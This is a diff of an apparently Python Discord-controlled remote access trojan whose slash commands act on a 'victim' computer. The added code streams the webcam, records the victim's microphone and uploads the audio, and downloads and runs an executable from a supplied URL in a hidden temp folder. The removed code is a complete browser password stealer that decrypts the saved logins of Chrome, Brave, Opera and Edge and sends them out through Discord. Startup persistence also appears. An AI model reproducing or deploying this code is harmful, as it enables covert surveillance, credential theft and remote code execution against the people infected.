+                    continue
+
+            if time.time() > end:
+                await ctx.send(f"Finshed streaming webcam!")
+        
+        await ctx.send(f"Streaming webcam for {seconds_length} Seconds")
+        await StreamWebcam(end)  
             
-
-# @slash.slash(name="StopWebCamStream", description="Stops webcam stream", guild_ids=g)
-# async def StreamWebCam_command(ctx: SlashContext): 
-#     if ctx.channel.name == channel_name:
-#         await ctx.send("Command executed!")
-#         import os
-#         os.system(r"mkdir %temp%\\hobo")
-#         os.system(r"echo hello>%temp%\\hobo\\hello.txt")
-#         os.system(r"del %temp\\temp.png /F")
-
 
 @slash.slash(name="DisplayOFF", description="Turns users Display OFF, Admin rights needed!", guild_ids=g)
 async def DisplayOFF_command(ctx: SlashContext):
@@ -1269,38 +857,59 @@ async def MessageBox_command(ctx: SlashContext, message: str):
         print(pyautogui.alert(f"{message}"))
 
 
-@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
-async def Play_command(ctx: SlashContext, youtube_link: str):
+@slash.slash(name="RecordAudio", description="record a 10s audio from the victim mic", guild_ids=g)
+async def RecordAudio_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        MaxVolume()
-        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
-            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
-            os.system(f'start {youtube_link}')
-            while True:
-                def get_all_hwnd(hwnd, mouse):
-                    def winEnumHandler(hwnd, ctx):
-                        if win32gui.IsWindowVisible(hwnd):
-                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
-                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-                                global pid_process
-                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
-                                return "ok"
-                        else:
-                            pass
-                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
-                        win32gui.EnumWindows(winEnumHandler,None)
-                try:
-                    win32gui.EnumWindows(get_all_hwnd, 0)
-                except:
-                    break
-        else:
-            await ctx.send("Invalid Youtube Link")
+        import sounddevice as sd
+        from scipy.io.wavfile import write
 
-@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
-async def Stop_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        ctx.send("stopped the music")
-        os.system(f"taskkill /F /IM {pid_process[1]}")
+        temp = (os.getenv("temp") + '\\Audio.wav')
+        fs = 44100  # Sample rate
+        seconds = 10  # Duration of recording
+
+        await ctx.send("Starting recorder. . .")
+
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(temp, fs, myrecording)
+        file = discord.File(temp, filename="Morris.wav")
+        await  ctx.send(f"Successfully recorded audio", file=file)
+
+
+
+# @slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
+# async def Play_command(ctx: SlashContext, youtube_link: str):
+#     if ctx.channel.name == channel_name:
+#         MaxVolume()
+#         if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
+#             await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
+#             os.system(f'start {youtube_link}')
+#             while True:
+#                 def get_all_hwnd(hwnd, mouse):
+#                     def winEnumHandler(hwnd, ctx):
+#                         if win32gui.IsWindowVisible(hwnd):
+#                             if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
+#                                 win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+#                                 global pid_process
+#                                 pid_process = win32process.GetWindowThreadProcessId(hwnd)
+#                                 return "ok"
+#                         else:
+#                             pass
+#                     if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
+#                         win32gui.EnumWindows(winEnumHandler,None)
+#                 try:
+#                     win32gui.EnumWindows(get_all_hwnd, 0)
+#                 except:
+#                     break
+#         else:
+#             await ctx.send("Invalid Youtube Link")
+
+
+# @slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
+# async def Stop_Play_command(ctx: SlashContext):
+#     if ctx.channel.name == channel_name:
+#         ctx.send("stopped the music")
+#         os.system(f"taskkill /F /IM {pid_process[1]}")
 
 
 @slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
@@ -1330,213 +939,33 @@ objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Wind
         else:
             await ctx.send("This command requires admin privileges")
 
-@slash.slash(name="GrabPasswords", description="Grabs google cookies and passwords", guild_ids=g)
-async def GrabPasswords_command(ctx: SlashContext):
+
+@slash.slash(name="GrabData", description="Grabs ALL browser data using builded add on", guild_ids=g)
+async def GrabData_command(ctx: SlashContext, download_link_url: str):
     if ctx.channel.name == channel_name:
-        await ctx.send("Grabbing Passwords. . .")
-        import json, base64, sqlite3, win32crypt, shutil, getpass, os
-        from Crypto.Cipher import AES
-
-
-        def decrypt_payload(cipher, payload):
-            return cipher.decrypt(payload)
-        def generate_cipher(aes_key, iv):
-            return AES.new(aes_key, AES.MODE_GCM, iv)
-        def decrypt_password(buff, master_key):
-            try:
-                iv = buff[3:15]
-                payload = buff[15:]
-                cipher = generate_cipher(master_key, iv)
-                decrypted_pass = decrypt_payload(cipher, payload)
-                decrypted_pass = decrypted_pass[:-16].decode()
-                return decrypted_pass
-            except Exception as e:
-                print(str(e))
-
-
-        username = getpass.getuser()
-        #######################################################################
-        #######################################################################
-        #######################################################################
-        try:
-            def get_master_key():
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                master_key = master_key[5:]  # removing DPAPI
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-            if __name__ == '__main__':
-                master_key = get_master_key()
-                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
-                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                conn = sqlite3.connect("Loginvault.db")
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("GooglePasswords.txt","a") as f:
-                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                            f.close()
-                except Exception as e:
-                    pass
-                cursor.close()
-                conn.close()
-                try:
-                    os.remove("Loginvault.db")
-                except Exception as e:
-                    pass
-        except FileNotFoundError:
-            pass
-        #######################################################################
-        #######################################################################
-        #######################################################################
-        try:
-            def get_master_key():
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                master_key = master_key[5:]  # removing DPAPI
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-            if __name__ == '__main__':
-                master_key = get_master_key()
-                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
-                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                conn = sqlite3.connect("Loginvault.db")
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("BravePasswords.txt","a") as f:
-                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                            f.close()  
-                except Exception as e:
-                    pass
-                cursor.close()
-                conn.close()
-                try:
-                    os.remove("Loginvault.db")
-                except Exception as e:
-                    pass
-        except FileNotFoundError:
-            pass
-        #######################################################################
-        #######################################################################
-        #######################################################################
-        try:
-            def get_master_key():
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                master_key = master_key[5:]  # removing DPAPI
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-            if __name__ == '__main__':
-                master_key = get_master_key()
-                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
-                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                conn = sqlite3.connect("Loginvault.db")
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("OperaPasswords.txt","a") as f:
-                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                            f.close()
-                except Exception as e:
-                    pass
-                cursor.close()
-                conn.close()
-                try:
-                    os.remove("Loginvault.db")
-                except Exception as e:
-                    pass
-        except FileNotFoundError:
-            pass
-        #######################################################################
-        #######################################################################
-        #######################################################################
-        try:
-            def get_master_key():
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                master_key = master_key[5:]  # removing DPAPI
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-            if __name__ == '__main__':
-                master_key = get_master_key()
-                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
-                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                conn = sqlite3.connect("Loginvault.db")
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("EdgePasswords.txt","a") as f:
-                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                            f.close()             
-                except Exception as e:
-                    pass
-                cursor.close()
-                conn.close()
-                try:
-                    os.remove("Loginvault.db")
-                except Exception as e:
-                    pass
-        except FileNotFoundError:
-            pass
-
-
-        ## Send Found Data
-        try:
-            file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
-            await ctx.send("Found GooglePasswords", file=file1)
-        except FileNotFoundError:
-            await ctx.send("User has not got CHROME downloaded!")
+        await ctx.send("Attempting to download and start data grabber. . .")
+        temp = (os.getenv("temp"))
 
         try:
-            file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
-            await ctx.send("Found BravePasswords", file=file2)
-        except FileNotFoundError:
-            await ctx.send("User has not got BRAVE downloaded!")
+            #? Create cache folder
+            if os.path.exists(f'{temp}\\$~cache'):
+                pass
+            else:
+                os.mkdir(f'{temp}\$~cache')
 
-        try:
-            file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
-            await ctx.send("Found OperaPasswords", file=file3)
-        except FileNotFoundError:
-            await ctx.send("User has not got OPERA downloaded!")
+            #? Download DataGrabber
+            url = download_link_url
+            r = requests.get(f"{url}")
+            with open(f'{temp}\\$~cache\\ds.exe', 'wb') as f:
+                f.write(r.content)
+            f.close()
 
-        try:
-            file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
-            await ctx.send("Found EdgePasswords", file=file4)
-        except FileNotFoundError:
-            await ctx.send("User has not got EDGE downloaded!")
-
-
-        os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
-
+            #? Run DataGrabber
+            os.startfile(f'{temp}\\$~cache\\ds.exe')
+            await ctx.send(f"Data grabber started successfully!")
+        except Exception as e:
+            await ctx.send(f"Error occured! \n```{e}```")
+        
 
 @slash.slash(name="StartProc", description="Starts process using DIR", guild_ids=g)
 async def StartProc_command(ctx: SlashContext, dirtofile: str):
